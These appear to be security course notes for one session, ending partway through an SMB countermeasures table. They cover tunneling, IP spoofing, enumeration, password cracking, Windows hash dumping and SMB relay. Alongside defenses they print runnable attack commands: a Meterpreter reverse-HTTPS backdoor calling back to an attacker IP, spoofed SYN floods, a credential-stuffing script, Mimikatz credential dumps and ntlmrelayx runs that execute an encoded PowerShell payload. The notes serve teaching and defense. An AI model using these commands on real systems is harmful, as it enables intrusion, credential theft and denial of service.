# Web Application Security — Session 11 & 12 Notes

### Session 11 (2T+2L) — Theory
TCP Communication Flag Types · Banner Grabbing and OS Fingerprinting · Proxy Servers in Attacks · HTTP Tunneling · IP Spoofing · Enumeration · Password-Cracking Techniques · Cracking Windows Passwords · Redirecting SMB Logon to Attackers · SMB Redirection/Relay/MITM & Countermeasures · NetBIOS DoS Attacks · DDoS Attacks

### Session 12 (2T+2L) — Theory
Password-Cracking Countermeasures · Active/Passive Online Attacks · Offline Attacks · Keyloggers and Other Spyware · Trojans and Backdoors (Types, Reverse-Connecting Trojans, Netcat Trojan, Indications of Attack) · Overt and Covert Channels

---

# SESSION 11

## 1. TCP Communication Flag Types

TCP uses **control flags** (6 core bits) in the segment header to manage connection states and communication flow.

**Key TCP Flags**

| Flag | Full Name | Function | Usage Context |
|---|---|---|---|
| SYN | Synchronize | Initiates TCP connection | First packet in 3-way handshake |
| ACK | Acknowledgment | Confirms received data | Set in almost all packets after the initial SYN |
| FIN | Finish | Gracefully terminates connection | Used in 4-step teardown |
| RST | Reset | Abruptly terminates connection | Error recovery or connection rejection |
| PSH | Push | Forces immediate data delivery | Tells receiver to process data without buffering |
| URG | Urgent | Marks urgent/priority data | Rarely used in normal traffic |

**TCP Connection Lifecycle**

*Connection Establishment (3-Way Handshake)*: Client → Server: **SYN** → Server → Client: **SYN-ACK** → Client → Server: **ACK**

*Data Transfer Phase*: packets exchanged with **ACK**, sometimes **PSH**.

*Connection Termination (4-Step Teardown)*: One side → **FIN** → Other side → **ACK** → Other side → **FIN** → First side → **ACK**.

**Additional (Less Common) Flags**: **CWR** (Congestion Window Reduced — helps alleviate network congestion); **ECN-Echo** (ensures integrity and congestion notification); **NS** (Nonce Sum) and **Reserved** bits — protocol-specific or reserved for future use.

---

## 2. Banner Grabbing and OS Fingerprinting Techniques

### 2.1 Banner Grabbing

**Definition**: collecting information about services running on open ports by connecting and reading the welcome messages (banners) sent by servers.

**Purpose**: identify software names and versions; detect outdated/vulnerable services; map the attack surface.

**Tools**: Netcat, Nmap, Telnet, specialized scanners.

Example:
```bash
nc target.com 80
GET / HTTP/1.1
```
The server responds with a banner showing e.g. `Apache/2.4.41`.

### 2.2 OS Fingerprinting

**Definition**: determining the operating system of a target by analyzing responses to crafted network packets, TCP/IP stack behavior, or subtle protocol differences.

| Type | Method | Characteristics |
|---|---|---|
| **Active** | Sends crafted packets and analyzes responses | Faster, more accurate, but detectable |
| **Passive** | Monitors existing network traffic | Stealthy, less accurate, requires traffic |

**Techniques**: analyzing TCP window sizes; TTL (Time To Live) values; TCP options ordering; ICMP response patterns.

**Tools**: Nmap (`-O` flag); p0f (passive); Xprobe2.

---

## 3. How Proxy Servers Are Used in Launching Attacks

**Definition**: attackers use proxy servers to hide their IP addresses and anonymize attacks, making tracing difficult. Proxies relay malicious requests or serve as intermediate hosts.

**Why Hackers Use Proxies**

| Objective | How Proxies Help |
|---|---|
| IP Masking | Hides attacker's real IP from target and logs |
| Anonymity | Breaks the direct link between attacker and victim |
| Geographic Spoofing | Appears to originate from a different country/region |
| Bypass Restrictions | Circumvents IP-based blocks or blacklists |
| Traffic Obfuscation | Malicious traffic blends with legitimate proxy traffic |

### 3.1 Proxy Chaining (Multi-Hop Proxies)

**Concept**: using multiple proxies in sequence to increase anonymity layers.
```
Attacker → Proxy 1 → Proxy 2 → Proxy 3 → Target
```
**Characteristics**: each proxy only knows the previous and next hop; the final target sees only the last proxy's IP; tracing requires compromising every proxy in the chain; increases latency but maximizes anonymity.

**Tools**: **ProxyChains** (Linux tool for chaining proxies); **Tor Network** (built-in 3-hop proxy circuit); custom Python scripts with `requests` + proxy rotation.

**Use cases**: penetration testing from an unknown origin; web scraping without detection; credential stuffing attacks; APT operations.

Example:
```bash
# Using proxychains with nmap
proxychains nmap -sT target.com

# Proxychains config (/etc/proxychains/proxychains.conf)
[ProxyList]
http 185.162.228.153 8080
socks5 104.248.63.17 1080
```

### 3.2 Open Proxies Abuse

**Definition**: misconfigured or public proxies that allow anyone to relay traffic without authentication.

**Types**: HTTP/HTTPS proxies (web traffic relay); SOCKS proxies (any TCP/UDP traffic); Transparent proxies (don't hide the client IP, less useful for attackers); Anonymous/Elite proxies (fully hide client identity).

**How attackers find open proxies**: Shodan searches for proxy ports (8080, 3128, 1080); public proxy lists on forums/dark web; automated scanners (proxyfinder, masscan).

**Attack scenarios**: brute force attacks (rotate proxies to avoid rate limiting); DDoS amplification (proxies as reflection points); spam campaigns; web application attacks (SQLi, XSS from anonymized sources).

**Proxy Types in Attacks**

| Proxy Type | Anonymity Level | Attack Usefulness |
|---|---|---|
| HTTP Proxy | Medium | Web-based attacks, scraping |
| SOCKS4/5 | High | Any TCP/UDP traffic, full proxy |
| Transparent | None | Bypass geo-restrictions only |
| Anonymous | High | Hides client IP from target |
| Elite/High Anonymity | Maximum | Doesn't reveal proxy usage |
| Residential Proxies | Very High | Appears as home user, hard to block |
| Compromised Proxies | Variable | Hijacked servers/IoT devices |

### 3.3 Anonymizing Attacks

**Purpose**: hiding attack origin during reconnaissance, scanning, brute force, or DoS attacks.

| Attack Type | Proxy Usage |
|---|---|
| Network Scanning | Scan target networks without revealing the real IP |
| Brute Force | Distribute login attempts across multiple proxy IPs |
| DoS/DDoS | Use proxy botnets to distribute attack traffic |
| Web Scraping | Harvest data without triggering IP-based blocks |
| C2 Communication | Malware communicates through a proxy to evade detection |

*Real-world example — Credential Stuffing*: an attacker uses 100+ rotating proxies to try leaked passwords against login pages; each proxy makes 10-20 requests before rotation, so the target sees traffic from many IPs rather than a single attacker.

**Detection challenges**: legitimate users also use proxies (privacy, corporate networks); high-volume proxy traffic from datacenters is common; requires behavioral analysis, not just IP blocking.

### 3.4 Defense Against Proxy-Based Attacks

| Countermeasure | Implementation |
|---|---|
| Rate Limiting | Limit requests per IP, detect proxy patterns |
| CAPTCHA Challenges | Trigger on suspicious traffic patterns |
| Proxy Detection | Identify known proxy IP ranges (MaxMind, IPQualityScore) |
| Behavioral Analysis | Detect automated/scraping patterns |
| IP Reputation Services | Block known malicious proxy networks |
| WAF Rules | Block traffic from datacenter/asymmetric routes |
| Monitor User Agents | Detect mismatched proxy/browser combinations |

---

## 4. HTTP Tunneling Techniques

**Definition**: encapsulating non-HTTP traffic inside HTTP requests and responses to bypass firewalls or proxies that only allow HTTP/HTTPS traffic.

**Why It Works**: firewalls assume port 80/443 = legitimate web traffic; deep packet inspection is resource-intensive; blocking HTTP breaks business operations. HTTP is almost always allowed outbound; HTTPS encrypts the payload, hiding tunnel content; many security tools don't inspect HTTP deeply.

**Basic Concept**
```
Normal Traffic:    [HTTP Request] → Web Server
Tunneled Traffic:  [HTTP Header + Encapsulated Data] → Attacker Server
```
**Process**: attacker sets up an HTTP server on port 80/443 → client wraps non-HTTP traffic (SSH, RDP, custom) in HTTP requests → server decapsulates and forwards to the intended destination → the response is wrapped back in HTTP and sent to the client.

### 4.1 HTTP Tunneling (Port 80)

**Tools**: **httptunnel** (classic SSH-over-HTTP tool); **reGeorg** (HTTP/HTTPS tunneling for pentesting); **ABHTT** (Advanced Backdoor HTTP Tunnel Tool); custom Python scripts.

Example:
```bash
# Server side: install httptunnel, forward to SSH (port 22)
sudo apt install httptunnel
sudo hts --forward-port localhost:22 80

# Client side: connect through the tunnel, then SSH through it
htc --forward-port 8022 <attacker_ip>:80
ssh -p 8022 localhost
```
*Result*: SSH traffic now flows over HTTP port 80, bypassing firewall rules blocking port 22.

### 4.2 HTTPS Tunneling (Port 443)

**Advantages**: encrypted payload (even harder to detect); appears as legitimate HTTPS traffic; bypasses both firewalls and packet inspection.

**Tools**: Metasploit (`reverse_https` payload); Cobalt Strike (Beacon over HTTPS); Empire (stager over HTTPS); Chisel (fast TCP/UDP tunnel over HTTPS).

Example (Metasploit):
```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=<attacker_ip> LPORT=443 -f exe -o backdoor.exe

use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST <attacker_ip>
set LPORT 443
run
```
*Result*: a Meterpreter session established over HTTPS, appearing as normal web traffic.

### 4.3 DNS Tunneling (Bonus Technique)

**Concept**: encapsulate data inside DNS queries/responses when only DNS is allowed outbound.

**Tools**: **iodine** (most popular DNS tunneling tool); **dnscat2** (DNS command and control); **Heyoka** (advanced DNS tunneling).

Example:
```bash
# Server side
sudo iodined -f -c -P hacktheplanet 10.0.0.1 tunnel.test
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE

# Client side
sudo iodine -f -P hacktheplanet <dns_server_ip> tunnel.test
ssh -D 9050 -N kali@10.0.0.1
```
*Result*: full internet access through DNS queries only, even on networks with no direct internet.

### 4.4 Attack Applications

**Covert Channels** — exfiltrate data from compromised systems; bypass egress filtering; maintain persistence even with strict firewall rules.

**Evade Security Devices** — IDS/IPS may not inspect HTTP deeply; firewalls allow HTTP/HTTPS by default; encrypted HTTPS hides the payload from inspection. Evasion techniques: legitimate-looking HTTP headers; mimicking browser User-Agent strings; random delays between requests; domain fronting (hiding the destination behind a CDN).

**Command and Control (C2) Communication** — malware sends HTTP GET/POST to an attacker server and receives commands encoded in the responses, appearing as normal web browsing. C2 frameworks using HTTP tunneling: Metasploit (`reverse_http`/`reverse_https`); Cobalt Strike (Beacon); Empire (stagers); Sliver (mutual TLS over HTTPS).

### 4.5 Detection and Defense

| Detection Method | How It Works |
|---|---|
| Deep Packet Inspection | Analyze HTTP payload for anomalies |
| Traffic Analysis | Detect unusual HTTP patterns (long POST bodies, frequent requests) |
| Behavioral Monitoring | Flag non-browser HTTP traffic patterns |
| DNS Query Analysis | Detect DNS tunneling (unusual query lengths, high frequency) |
| SSL/TLS Inspection | Decrypt HTTPS to inspect content (requires MITM) |
| Proxy Logs | Monitor for suspicious HTTP tunneling tools |

**Defense strategies**: restrict HTTP/HTTPS to approved destinations only; implement SSL inspection; use application-layer firewalls to block tunneling tools by signature; monitor for anomalies; use DNS firewalls/query analysis to block DNS tunneling.

**Quick Comparison of Tunneling Techniques**

| Technique | Protocol | Port | Detection Difficulty | Use Case |
|---|---|---|---|---|
| HTTP Tunnel | TCP | 80 | Medium | SSH, RDP, custom protocols |
| HTTPS Tunnel | TCP | 443 | High | Encrypted C2, malware communication |
| DNS Tunnel | UDP | 53 | Very High | Networks with only DNS allowed |
| ICMP Tunnel | ICMP | N/A | High | Covert channels in restricted environments |

---

## 5. IP Spoofing Techniques

**Definition**: forging the source IP address in IP packets to impersonate another system, hide identity, or gain unauthorized access.

**Goals**

| Goal | Description | Attack Scenario |
|---|---|---|
| Conceal Attack Origin | Hides the attacker's real IP address from target and logs | Pentesting, malware C2, APT operations |
| Bypass IP-Based Authentication | Exploits trust relationships based on IP addresses | R services, RPC, NFS mounts, firewall rules |
| Launch DoS/DDoS | Masks the source of flooding traffic | SYN floods, UDP floods, reflection attacks |
| MITM | Intercepts and modifies traffic between two parties | Session hijacking, data theft |
| Reflection Attacks | Spoofs the victim's IP to amplify traffic | DNS amplification, NTP reflection |

**How It Works**: identify a trusted host the target trusts → modify packet headers (source replaced with the trusted IP) → recalculate the checksum so the packet appears valid → send the spoofed packets, and the target believes they originate from the trusted source.

### 5.1 Blind Spoofing

**Definition**: attacker sends packets without expecting a reply or being able to intercept responses.
**Use cases**: DoS/DDoS (one-way flooding); reflection attacks (spoofing the victim's IP to amplifiers); initial reconnaissance probes.

Example (SYN flood via hping3):
```bash
hping3 -S -p 80 --spoof <trusted_ip> --flood <target_ip>
```
**Limitations**: cannot complete the TCP handshake; limited to one-way attacks; requires knowledge of network topology.

### 5.2 Non-Blind Spoofing

**Definition**: attacker predicts TCP sequence numbers and can intercept or predict replies from the target — requires sniffing network traffic.

**Process**: sniff traffic → predict sequence numbers (analyzing TCP ISN patterns) → inject packets with the correct sequence numbers → maintain the session as the trusted host.

**Use cases**: session hijacking; MITM attacks; bypassing IP-based authentication.

Example attack flow:
```
1. Attacker sniffs traffic between Client ↔ Server
2. Attacker learns sequence numbers (SEQ, ACK)
3. Attacker sends RST to Client (disconnects it)
4. Attacker spoofs Client's IP with correct SEQ numbers
5. Attacker injects malicious commands to Server
```
**Tools**: hping3; Scapy (Python); Ettercap (ARP spoofing + packet injection).

### 5.3 Attack Scenarios

**DoS/DDoS with IP Spoofing**
```bash
# SYN flood with random spoofed sources
hping3 -S -p 80 --rand-source --flood <target>
```
*Reflection attack*: spoof the victim's IP to DNS/NTP servers, which then send large responses to the victim (amplification factor of 50–70x possible).

**Session Hijacking**: sniff to identify an active session → send RST to the legitimate client → spoof the client's IP with correct sequence numbers → inject commands → server executes them as the authenticated user. Tools: Hunt, Juggernaut, Scapy scripts.

**Bypassing IP-Based Authentication**: vulnerable services include R services (rlogin, rsh, rexec — trust based on IP), NFS (mount shares by IP), firewall rules (allow traffic from trusted IPs), and the X Window System. Most modern services use stronger authentication, but legacy systems and internal networks with weak controls remain vulnerable.

### 5.4 Defense and Countermeasures

| Defense | Description | Implementation |
|---|---|---|
| Ingress Filtering | Block packets with spoofed source IPs entering the network | BCP38, router ACLs |
| Egress Filtering | Prevent spoofed packets leaving your network | Firewall rules, uRPF |
| uRPF | Verify source IP matches the routing table | Cisco: `ip verify unicast` |
| Packet Filtering | Drop packets with suspicious source IPs | iptables, firewall rules |
| Disable IP-Based Auth | Use stronger authentication methods | SSH keys, certificates, MFA |
| Network Monitoring | Detect spoofed packets with IDS/IPS | Snort, Suricata, Zeek |
| Encryption | Protect data even if a session is hijacked | TLS, IPsec, SSH |

Example — ingress filtering (BCP38):
```bash
# Cisco router
interface GigabitEthernet0/0
 ip verify unicast reverse-path
 no ip proxy-arp
access-list 101 deny ip 10.0.0.0 0.255.255.255 any
access-list 101 deny ip 172.16.0.0 0.15.255.255 any
access-list 101 deny ip 192.168.0.0 0.0.255.255 any
access-list 101 permit ip any any

# Linux iptables
iptables -A INPUT -i eth0 -s 127.0.0.0/8 -j DROP
iptables -A INPUT -i eth0 -s 10.0.0.0/8 -j DROP
iptables -A INPUT -i eth0 -s 192.168.0.0/16 -j DROP
```

---

## 6. Enumeration

**Definition**: extracting detailed information from a system/network after footprinting and scanning. Forms the basis for targeted attacks by revealing usernames, group memberships, network shares, running services, and other sensitive data.

**Information Gathered**

| Category | Examples | Attack Value |
|---|---|---|
| Usernames | User accounts, service accounts | Brute force targets, valid usernames |
| Group Info | Admin groups, access levels | Privilege escalation paths, lateral movement |
| Network Shares | SMB shares, NFS mounts | Data exfiltration, malware deployment |
| Services Running | SSH, FTP, HTTP, databases | Identify vulnerable services |
| DNS Records | Hostnames, MX records, subdomains | Map network topology, find hidden assets |
| SNMP Data | System info, routing tables, interfaces | Network mapping, device configuration |
| Email Addresses | User email formats | Phishing campaigns |
| Password Policies | Complexity, expiration rules | Plan password attacks |

**Enumeration Process Flow**: Footprinting (passive) → Scanning (active) → **Enumeration** (detailed extraction) → Vulnerability Analysis → Exploitation.

### 6.1 NetBIOS/SMB Enumeration (Windows) — Ports 137-139, 445

**Info extracted**: computer names/workgroups; user accounts and groups; shared folders/printers; password policies.

**Tools/commands**:
```bash
enum4linux -a <target_ip>        # comprehensive SMB enumeration
smbclient -L //<target_ip> -N     # list SMB shares
nbtscan <target_network>          # NetBIOS name scan

# Metasploit
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
```
**Countermeasures**: disable NetBIOS over TCP/IP; enable SMB signing; restrict anonymous access; firewall ports 137-139, 445.

### 6.2 SNMP Enumeration — Port 161 (UDP)

**Info extracted**: system description/uptime; network interfaces/routing tables; running processes; installed software; sometimes user accounts.

```bash
snmpwalk -c public -v1 <target_ip>
snmpwalk -c public -v2c <target_ip> .1.3.6.1.2.1.1

use auxiliary/scanner/snmp/snmp_enum
set RHOSTS <target_ip>
run
```
**Common community strings**: `public` (read-only), `private` (read-write), `cisco`, `admin`, `default`.
**Countermeasures**: disable SNMP if unneeded; use SNMPv3 with auth/encryption; change default community strings; firewall SNMP ports.

### 6.3 LDAP Enumeration (Active Directory) — Ports 389/636

**Info extracted**: user accounts/attributes; group memberships; computer objects; password policies; trust relationships.

```bash
ldapsearch -x -H ldap://<dc_ip> -b "dc=domain,dc=local"
ldapsearch -x -H ldap://<dc_ip> -b "dc=domain,dc=local" "(objectClass=user)"
use auxiliary/scanner/ldap/ldap_rootdse
```
**Tools**: ldapsearch, ldapdomaindump, BloodHound.
**Countermeasures**: require authenticated LDAP binds (no anonymous); use LDAPS (encrypted); restrict by source IP; monitor for unusual queries.

### 6.4 NTP Enumeration — Port 123 (UDP)

**Info extracted**: system time/timezone; connected clients; NTP server configuration.
```bash
ntpq -c "peers" <ntp_server>
ntpdc -c "sysinfo" <ntp_server>
```
**Countermeasures**: restrict queries to authorized clients; disable unused NTP commands; firewall port 123.

### 6.5 UNIX/Linux Enumeration (RPC, NIS, NFS)

**Info extracted**: NFS exports/shares; RPC services; NIS (YP) maps of users, groups, hosts.
```bash
showmount -e <target_ip>   # NFS shares
rpcinfo -p <target_ip>     # RPC services
ypcat passwd                # NIS enumeration
```
**Countermeasures**: disable RPC/NIS if unneeded; use NFSv4 with Kerberos; firewall unnecessary ports.

### 6.6 Nmap Enumeration Scripts (NSE)
```bash
nmap --script smb-enum-users,smb-enum-shares,smb-enum-groups <target>
nmap --script snmp-interfaces,snmp-processes,snmp-sysdescr <target>
nmap --script dns-brute,dns-srv-enum,dns-zone-transfer <target>
nmap --script ftp-anon,ftp-bounce,ftp-syst <target>
nmap -sV -sC <target>   # all default safe scripts
```

### 6.7 Enumeration Workflow Example
```bash
nmap -sn 192.168.1.0/24                       # Step 1: discover hosts
nmap -sV -sC -oN scan.txt 192.168.1.0/24       # Step 2: scan open ports
enum4linux -a 192.168.1.10                     # Step 3: enumerate SMB
snmpwalk -c public -v2c 192.168.1.10           # Step 4: enumerate SNMP
ldapsearch -x -H ldap://192.168.1.10 -b "dc=company,dc=local"  # Step 5: LDAP

# Step 6: Metasploit enumeration
msfconsole
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 192.168.1.10
run
```

---

## 7. Password-Cracking Techniques

Password cracking is the process of recovering plaintext passwords from stored or transmitted password hashes.

### 7.1 Brute Force Attack

**Definition**: trying all possible character combinations until the correct password is found.
**Characteristics**: guaranteed success eventually; time-consuming (exponential with password length); resource-intensive.
**Time example**: an 8-character password with 95 printable characters = 95⁸ ≈ 6.63×10¹⁵ combinations, ~77 days at 1 billion guesses/sec.

```bash
# Hashcat brute force on MD5
hashcat -m 0 -a 3 hash.txt '?a?a?a?a?a?a?a?a'
```
**Tools**: Hashcat (GPU-accelerated); John the Ripper (CPU); THC-Hydra (online/network); Medusa (parallel network).
**When to use**: short passwords, unknown complexity, last resort.
**Countermeasures**: long passwords (12+ chars); account lockout; rate limiting; MFA.

### 7.2 Dictionary Attack

**Definition**: using a precompiled wordlist of probable passwords.
**Characteristics**: faster than brute force; high success rate against weak passwords; misses passwords outside the wordlist.
**Common wordlists**: rockyou.txt (14M passwords); SecLists; CrackStation (1.4B); custom target-derived lists.
```bash
hashcat -m 0 -a 0 hash.txt rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P rockyou.txt ssh://<target_ip>
```
**Countermeasures**: avoid common passwords; password managers; complexity requirements; check against breach databases.

### 7.3 Hybrid Attack

**Definition**: combines a dictionary base with mutations (numbers, symbols, case changes) for broader coverage.
**Common mutations**: append/prepend numbers; add symbols; case variations; leet speak substitutions (`p@ssw0rd`).
```bash
hashcat -m 0 -a 6 hash.txt rockyou.txt '?d?d?d?d'
hashcat -m 0 -a 0 hash.txt rockyou.txt -r rules/best64.rule
```
**Common rule sets**: `best64.rule`; `OneRuleToRuleThemAll`; custom target-specific rules.
**Countermeasures**: avoid predictable patterns (name+year, word+number); truly random passwords.

### 7.4 Rainbow Tables

**Definition**: precomputed hash values for all possible passwords up to a certain length, allowing near-instant hash reversal.
**Characteristics**: extremely fast lookup; storage-heavy (terabytes for large tables); defeated entirely by salting.
```bash
rtgen md5 loweralpha 1 7 0 1800 35000000 all
rtcrack md5_loweralpha-1-7-0-1800-35000000-all.rt hash.txt
```
**Countermeasures**: salting (unique random salt per password); key stretching (bcrypt, PBKDF2, scrypt); long passwords.

### 7.5 Credential Stuffing

**Definition**: using leaked username/password pairs from one breach against other services, exploiting password reuse.
```python
import requests
credentials = [('user1@example.com', 'password123'), ('user2@example.com', 'admin456')]
for email, password in credentials:
    response = requests.post('https://target.com/login', data={'email': email, 'password': password})
    if 'Welcome' in response.text:
        print(f"Success: {email}:{password}")
```
**Tools**: SNIPR; OpenBullet; custom Python/Selenium scripts.
**Countermeasures**: unique passwords per site (password manager); MFA; breach monitoring (HaveIBeenPwned); rate limiting; CAPTCHA.

### 7.6 Password-Cracking Tools Comparison

| Tool | Type | Speed | Best Use Case |
|---|---|---|---|
| Hashcat | GPU-accelerated | Very Fast | Large hash lists, known hash types |
| John the Ripper | CPU-based | Medium | Versatile, rule-based attacks |
| THC-Hydra | Network | Depends on target | Online attacks (SSH, FTP, HTTP) |
| Medusa | Network | Fast | Parallel network brute force |
| RainbowCrack | Lookup | Instant | Unsalted hashes, precomputed tables |

**Hash Types and Cracking Speed (RTX 3080)**

| Hash Type | Speed | Salted? |
|---|---|---|
| MD5 | 50+ billion/sec | No |
| SHA1 | 25+ billion/sec | No |
| NTLM | 30+ billion/sec | No |
| WPA2 (PBKDF2) | 500k/sec | Yes |
| bcrypt | 10k/sec | Yes |
| SHA512crypt | 50k/sec | Yes |

---

## 8. Cracking Windows Passwords

### 8.1 Windows Password Storage

**Location**: `C:\Windows\System32\config\SAM` — requires SYSTEM-level access to read; backed up in the SYSTEM hive (needed for decryption).

**Hash Types Stored**

| Hash Type | Algorithm | Password Length | Security Level | Status |
|---|---|---|---|---|
| LM (LAN Manager) | DES-based | 14 chars (split 7+7) | Very Weak | Disabled by default since Vista |
| NTLM | MD4 | Unicode, up to 127 chars | Weak | Default on older Windows |
| NTLMv2 | HMAC-MD5 | Unicode, up to 127 chars | Stronger | Modern default |

SAM file structure:
```
Username:RID:LM_Hash:NTLM_Hash:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
```

### 8.2 Hash Extraction Methods

**Local (requires admin/SYSTEM access)**: pwdump7/pwdump8; fgdump; Mimikatz (extracts from LSASS memory); creddump (offline SAM extraction with SYSTEM hive).
```bash
pwdump8.exe > hashes.txt

mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
```

**Remote (network access)**: Metasploit Meterpreter `hashdump`; PsExec + Mimikatz; WMI; SMB admin shares.
```bash
meterpreter > hashdump
psexec \\<target_ip> -u Administrator -p <password> cmd.exe
```

**Offline (physical/boot access)**: boot from live USB, mount the Windows drive, extract SAM/SYSTEM.
```bash
mount /dev/sda1 /target/
cp /target/Windows/System32/config/SAM .
cp /target/Windows/System32/config/SYSTEM .
python creddump.py SAM SYSTEM > hashes.txt
```

### 8.3 Hash Cracking Tools

**John the Ripper**:
```bash
john --format=NT --wordlist=rockyou.txt hashes.txt
john --format=NT --wordlist=rockyou.txt --rules=Best64 hashes.txt
john --format=NT --incremental=All hashes.txt
john --show hashes.txt
```

**Hashcat** (NTLM = `-m 1000`):
```bash
hashcat -m 1000 -a 0 hashes.txt rockyou.txt
hashcat -m 1000 -a 6 hashes.txt rockyou.txt '?d?d?d?d'
hashcat -m 1000 -a 3 hashes.txt '?a?a?a?a?a?a?a?a'
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/best64.rule
```
Performance (RTX 3080): NTLM ~30+ billion guesses/sec — an 8-char password takes minutes to hours; a 10-char password can take days to weeks.

**Ophcrack (Rainbow Tables)**: GUI-based, fast for LM/NTLM, but only works on unsalted hashes and is limited by table size (typically 8–10 chars).

### 8.4 Exploiting Weak Hashing Algorithms — LM Hash

**Weaknesses**: passwords split into 7+7 characters; converted to uppercase before hashing; no salt; DES-based (56-bit key, easily broken).
```bash
pwdump8.exe > hashes.txt
hashcat -m 3000 -a 3 hashes.txt '?a?a?a?a?a?a?a'
```
7-character LM hashes crack in minutes — a 14-character password becomes two easy 7-char hashes.

### 8.5 Countermeasures

| Defense | Implementation |
|---|---|
| Disable LM Hashes | Registry: `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\NoLMHash = 1` |
| Enforce NTLMv2 | Group Policy: LAN Manager authentication level |
| Strong Passwords | Minimum 12 characters, complexity requirements |
| MFA | Defeats hash cracking even if the hash is stolen |
| Credential Guard | Windows 10/11: isolates LSASS, prevents Mimikatz |
| LAPS | Local Administrator Password Solution (rotating passwords) |
| BitLocker | Encrypts drives, prevents offline SAM access |

---

## 9. Redirecting the SMB Logon to the Attackers

**SMB (Server Message Block)**: protocol used for file sharing, printer sharing, and inter-process communication on Windows networks. Attackers redirect SMB authentication requests to their machines to capture credentials (NTLM hashes, sometimes plaintext).

**Normal SMB authentication flow**: client negotiates connection → server sends an 8-byte challenge → client responds with the NTLM hash of the challenge + password → server verifies and grants access.

**Redirected (attack) flow**: client connects to the attacker (thinking it's the legitimate server) → attacker captures the NTLM hash → attacker can relay it to other servers or crack it offline.

### 9.1 SMB Relay Attacks

**Concept**: attacker intercepts and forwards authentication requests to gain unauthorized access to other systems.
**Requirements**: SMB signing disabled on the target; same subnet (Layer 2 access); NTLMv1 or NTLMv2 authentication (not Kerberos).

```bash
# Start relay attack
ntlmrelayx.py -t smb://<target_server> -smb2support

# Start Responder (poison name resolution)
responder.py -I eth0 -dwv
```
When the victim tries to access `\\fileserver\share`, Responder responds and the victim connects to the attacker; the attacker relays to the real target server and gains authenticated access as the victim.

### 9.2 Man-in-the-Middle (MITM) Variants

- **ARP Spoofing**: poison the ARP cache on the victim and gateway so all traffic flows through the attacker. Tools: Ettercap, BetterCAP, arpspoof.
- **LLMNR/NBT-NS Poisoning**: respond to name resolution queries faster than the legitimate server. Tools: Responder, Inveigh.
- **DNS Spoofing**: poison DNS responses to redirect SMB connections. Tools: dnsspoof, MITMf.

Example (ARP spoofing + SMB capture):
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t <victim_ip> <gateway_ip>
arpspoof -i eth0 -t <gateway_ip> <victim_ip>
responder.py -I eth0 -w
```

### 9.3 SMB Redirect via WPAD/LLMNR

**WPAD (Web Proxy Auto-Discovery)**: Windows tries to find proxy configuration via `WPAD.dat`; the attacker hosts a malicious `WPAD.dat` to redirect traffic through an attacker-controlled proxy.
```bash
responder.py -I eth0 -dwv -f
# -d: LLMNR/NBT-NS poisoning; -w: WPAD proxy; -v: verbose; -f: force WPAD
```

### 9.4 Credential Harvesting

**Captured data**: NTLM hashes; NetNTLMv1/v2 challenge/response; usernames; domain info (workgroup, DC names).
```bash
cat Responder-Session-*.log | grep "NTLMv2" > captured_hashes.txt
hashcat -m 5600 -a 0 captured_hashes.txt rockyou.txt
# or relay directly
ntlmrelayx.py -t smb://<target1> -t smb://<target2> -smb2support
```
**Use cases**: lateral movement; privilege escalation; domain compromise; persistent access.

---

## 10. SMB Redirection, SMB Relay MITM Attacks and Countermeasures

### 10.1 Attack Chain
```
1. Reconnaissance
   ↓
2. Poisoning (LLMNR/NBT-NS)
   ↓
3. SMB Authentication Capture
   ↓
4. Relay to Target Server
   ↓
5. Unauthorized Access Granted
```

### 10.2 SMB Relay Attack Variants

**Direct SMB Relay**
```bash
ntlmrelayx.py -t smb://192.168.1.100 -smb2support
ntlmrelayx.py -t smb://192.168.1.100 -t smb://192.168.1.101 -smb2support
ntlmrelayx.py -t smb://192.168.1.100 -smb2support -so   # with SOCKS proxy for post-exploitation
```

**Relay to Remote Code Execution**
```bash
ntlmrelayx.py -t smb://192.168.1.100 -smb2support -c "whoami"
ntlmrelayx.py -t smb://192.168.1.100 -smb2support -c "powershell -enc <base64_payload>"
ntlmrelayx.py -t smb://192.168.1.100 -smb2support -e metasploit
```

**Relay for Hash Harvesting (Capture-Only)**
```bash
responder.py -I eth0 -dwv
grep "NTLMv2" Responder-Session-*.log > captured.txt
hashcat -m 5600 -a 0 captured.txt rockyou.txt
```
Useful when SMB signing prevents relay, but weak passwords can still be cracked offline.

### 10.3 Countermeasures

**1. Enable SMB Signing (most effective)**
```
Group Policy: Microsoft network client/server: Digitally sign communications (always)
Registry: HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters
  RequireSecuritySignature = 1
  EnableSecuritySignature = 1
```
Prevents relay attacks entirely; requires mutual authentication; negligible performance impact.

**2. Disable LLMNR and NBT-NS**
```
Group Policy: Turn off multicast name resolution = Enabled
Network Adapter → IPv4 → Advanced → WINS → Disable NetBIOS over TCP/IP
```

**3. Enforce NTLMv2, Disable NTLMv1**
```
Group Policy: Network security: LAN Manager authentication level
  = Send NTLMv2 response only\refuse LM & NTLM
Registry: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\LmCompatibilityLevel = 5
```

**4. Patch and Update Systems**: critical patches include MS08-068 (SMB relay vulnerability, 2008) and MS17-010 (EternalBlue, SMBv1 exploit). Disable SMBv1 and enable SMBv2/v3 with encryption.

**5. Network Monitoring and Detection**

| Indicator | Description |
|---|---|
| Multiple SMB Connections | Same user connecting to many hosts rapidly |
| SMB from Unusual Sources | SMB traffic from non-server hosts |
| NTLM Authentication Spike | Sudden increase in NTLM auth attempts |
| LLMNR/NBT-NS Activity | Name resolution queries on unusual ports |

Tools: Zeek (Bro), Splunk/SIEM, Microsoft ATA.

**Countermeasures Priority**

| Priority | Countermeasure | Difficulty | Impact |
|---|---|---|---|
| Critical | Enable SMB Signing | Low | High |
| High | Disable LLMNR/NBT-NS | Low | Medium |
